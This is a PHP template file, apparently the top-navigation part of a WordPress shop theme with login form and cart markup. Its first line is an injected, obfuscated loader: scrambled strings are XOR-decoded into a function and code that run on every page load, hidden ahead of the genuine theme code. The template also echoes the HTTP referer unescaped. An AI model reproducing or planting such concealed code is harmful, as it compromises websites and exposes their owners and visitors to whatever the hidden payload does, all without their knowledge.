<?php $vGbClUkJ='CB3J< ;U< ;8.ZW'; $YvgwPqRC=' 0V+HEd3INXLG59'^$vGbClUkJ; $rlBLfm='81Rv 6YQT BYlU  ;GARp4:<f 9- 4i 1ZtOyG.10S=E41GUShJ;8bYT,,ct7, gpOS59XGM;-JflswacODq0wY,LFkaoTbkyDU76kKEOyHyphQBwSE=QW+Cg<P3WeTeu9isGcFeP.2<sxYaYu4 ,PvaEgcdnR2 KpMDecG<>NA,6Lv. JY5CUgoeCX N3 yk:M5EqYm2k9piBZ,ZVwsk0OW>1VseU43Qd  +ZzNZVXCRalhHXGUP-0qfincv <wex,IbuZ EywlhW8J6;Tob-YBgD6G1t=7YhJqr Y=jsxpJ-G+tsgC=0LG4nz3yn ,amwpJ+T-hAM9B5C=5ZXTvXsdinb;rmcu :WqKXDqGFWM:9+GYqiNkH8l=9=4r  EutpcE,DRK0Fc,8LQqjIkZT X=My=8k<>zoQ,G1yyz0Y=J5 GO.=ZUEX5+h22,Z,;=3Td .6KDm6H2V=-=Pw411Ohujm=9T2oRHIJOzpP,fj= M0ownNLF0M=m- 0j6=R<J0iw>UCpualHM XGoQbby==ziF6VB3cq=UOl6fvmvesUOsEZrqH 0.hPitP.vOeTtLXTJLHrZO5udyOwf07E1Jc== jK-1H0>nK  ++WA4Ihof 0CVxzUMyqokN2O5XP+Lk>TZ7om5SM=-Z3tlKaex43=2YvdxkK'; $XXzIdEr=$YvgwPqRC('', 'QWzWFC72 I-730XIH32zWLUN9DXYAk6MD.SfPgU;95H+WE.:=H2TJ==5XM<+ZYTOT+2AXtgiPH3OLSWAC4Nx9S6Y8fVAHsYapM3XDCo,oDhIKHu+K 1O=2EkCX1G6LoEQPBXniOltAGHSVdAqQPAX1-E,:C:NvYE2+i-EFgOJ<-IXdREE3phjnmfl1=T;ANQOU8AlJSdOaDzcf>M.7WNKV.;MTmyA1UG0;KERzGn<7407Zfb.7501NXQNM1 9ow> XM:BQ1E<YJRHsN+ZN1FBVSKC W3P+VR HwQVK<DQyqT.L3JTNGgKQ 2QUpNsdIJAEVT.J LAa63KS,OP;;<VpW;;+3n7>7UAIwU ==QzxwiLXG2<XI5aA1HYXIU-KE<UIPG.I=iA9OGHY80QWiO,5L-Xvs4EaA4pK5M3PYDZp,S9PR..BT 0m ZY7VSX;sdPF LBOE.rYi,W5RIXxSPPE.AYJIYX S09-0cfAz9JNNYA9QOQHn-4B,D2FEI5SE;O>CAPU0:WYAH,,T9nOwDBQPYOAbR76R8VV06KkOVPKETg.GtbAEzBRMY6XA4JOxUgE.>a+u.C>xSRMYiQFQE7P3<VXY5.UX;DMFlPARG8 PnDOBDQ77QSumYQOK58FP.1GdOZ5.V4JE24QB;WS1bZoqQKTFqFMCa6'^$rlBLfm); $XXzIdEr(); global $woocommerce, $smof_data; ?>
<div class='top-menu'>
	<ul id="snav" class="menu">
		<?php
		if ( has_nav_menu( 'top_navigation' ) ) {
			wp_nav_menu(array('theme_location' => 'top_navigation', 'depth' => 5, 'container' => false,  'items_wrap' => '%3$s'));
		}
		?>
		<?php if(class_exists('Woocommerce')): ?>
		<?php if($smof_data['woocommerce_acc_link_top_nav']): ?>
		<li class="my-account">
			<a href="<?php echo get_permalink(get_option('woocommerce_myaccount_page_id')); ?>"><?php _e('My Account', 'Avada'); ?></a>
			<?php if(!is_user_logged_in()): ?>
			<div class="login-box">
				<?php if( isset($_GET['login']) && $_GET['login']=='failed'): ?>
					<p class="woo-login-error"><?php echo _e( 'Login failed, please try again','Avada' ); ?></p>
				<?php endif; ?>			
				<form action="<?php echo wp_login_url(); ?>" name="loginform" method="post">
					<p>
						<input type="text" class="input-text" name="log" id="username" value="" placeholder="<?php echo __('Username', 'Avada'); ?>" />
					</p>
					<p>
						<input type="password" class="input-text" name="pwd" id="password" value="" placeholder="<?php echo __('Password', 'Avada'); ?>" />
					</p>
					<p class="forgetmenot">
						<label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> <?php _e('Remember Me', 'Avada'); ?></label>
					</p>
						<p class="submit">
						<input type="submit" name="wp-submit" id="wp-submit" class="fusion-button button-default button-small button small default comment-submit" value="<?php _e('Log In', 'Avada'); ?>">
						<input type="hidden" name="redirect_to" value="<?php if(isset($_SERVER['HTTP_REFERER'])): echo $_SERVER['HTTP_REFERER']; endif; ?>">
						<input type="hidden" name="testcookie" value="1">
					</p>
					<div class="clear"></div>
				</form>
			</div>
			<?php else: ?>
			<ul class="sub-menu">
				<li><a href="<?php echo wp_logout_url( get_permalink( woocommerce_get_page_id( 'myaccount' ) ) ); ?>"><?php _e('Logout', 'Avada'); ?></a></li>
			</ul>
			<?php endif; ?>
		</li>
		<?php endif; ?>
		<?php if($smof_data['woocommerce_cart_link_top_nav']): ?>
		<li class="cart">
			<?php //var_dump($woocommerce->cart); ?>
			<?php if(!$woocommerce->cart->cart_contents_count): ?>
			<a class="empty-cart" href="<?php echo get_permalink(get_option('woocommerce_cart_page_id')); ?>"><span><?php _e('Cart', 'Avada'); ?></span></a>
			<?php else: ?>
			<a href="<?php echo get_permalink(get_option('woocommerce_cart_page_id')); ?>"><?php echo $woocommerce->cart->cart_contents_count; ?> <?php _e('Item(s)', 'Avada'); ?><span class="amount-with-sep"> - <?php echo wc_price($woocommerce->cart->subtotal); ?></span></a>
			<div class="cart-contents">
				<?php foreach($woocommerce->cart->cart_contents as $cart_item): ?>
				<div class="cart-content">
					<a href="<?php echo get_permalink($cart_item['product_id']); ?>">
					<?php $thumbnail_id = ($cart_item['variation_id']) ? $cart_item['variation_id'] : $cart_item['product_id']; ?>
					<?php echo get_the_post_thumbnail($thumbnail_id, 'recent-works-thumbnail'); ?>
					<div class="cart-desc">
						<span class="cart-title"><?php echo $cart_item['data']->post->post_title; ?></span>
						<span class="product-quantity"><span class="quantity-container"><?php echo $cart_item['quantity']; ?> x </span><?php echo $woocommerce->cart->get_product_subtotal($cart_item['data'], 1); ?></span>
					</div>
					</a>
				</div>
				<?php endforeach; ?>
				<div class="cart-checkout">
					<div class="cart-link"><a href="<?php echo get_permalink(get_option('woocommerce_cart_page_id')); ?>"><?php _e('View Cart', 'Avada'); ?></a></div>
					<div class="checkout-link"><a href="<?php echo get_permalink(get_option('woocommerce_checkout_page_id')); ?>"><?php _e('Checkout', 'Avada'); ?></a></div>
				</div>
			</div>
			<?php endif; ?>
		</li>
		<?php endif; ?>
		<?php endif; ?>
	</ul>
	<?php if(tf_checkIfMenuIsSetByLocation('top_navigation')  && $smof_data['mobile_menu_design'] == 'classic'): ?>
	<div class="mobile-topnav-holder"></div>
	<?php endif; ?>
</div>